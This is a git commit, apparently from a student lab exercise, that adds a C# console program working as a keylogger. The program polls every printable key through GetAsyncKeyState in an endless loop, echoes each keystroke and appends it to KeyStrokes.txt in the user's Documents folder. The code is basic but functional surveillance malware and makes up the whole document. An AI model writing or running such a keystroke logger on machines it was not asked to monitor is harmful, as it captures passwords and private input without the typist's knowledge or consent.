7b5f3d661bca6178ad9eaad503dcd531997f2d6e
Artem <61842660+temakazik@users.noreply.github.com>
2020-05-22 22:55:12 +0300

    1 task

---
+++ Lab4/Task1/Program.cs
@@ -0,0 +1,62 @@
+﻿using System;
+using System.Text;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.IO;
+
+namespace LR_4
+{
+    class Program
+    {
+        [DllImport("User32.dll")]
+        public static extern int GetAsyncKeyState(Int32 i);
+
+        //строка для хранения всех клавиш
+
+        static string kelLog = "";
+        static void Main(string[] args)
+        {
+
+            string filepath = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
+
+            if (!Directory.Exists(filepath))
+            {
+                Directory.CreateDirectory(filepath);
+            }
+
+            string path = (filepath + @"\KeyStrokes.txt");
+
+            if(!File.Exists(path))
+            {
+                using (StreamWriter sw = File.CreateText(path))
+                {
+
+                }
+            }
+
+            while (true)
+            {
+                Thread.Sleep(5);
+
+                //проверить все ключи для их состояния
+
+                for (int i = 32; i < 127; i++)
+                {
+                    int keyState = GetAsyncKeyState(i);
+
+                    if (keyState == 32769)
+                    {
+                        Console.Write((char)i + ", ");
+
+                        using (StreamWriter sw = File.AppendText(path))
+                        {
+                            sw.Write((char)i);
+                        }
+                        //сохранить в текстовый файл
+                    }
+
+                }
+            }
+        }
+    }
+}
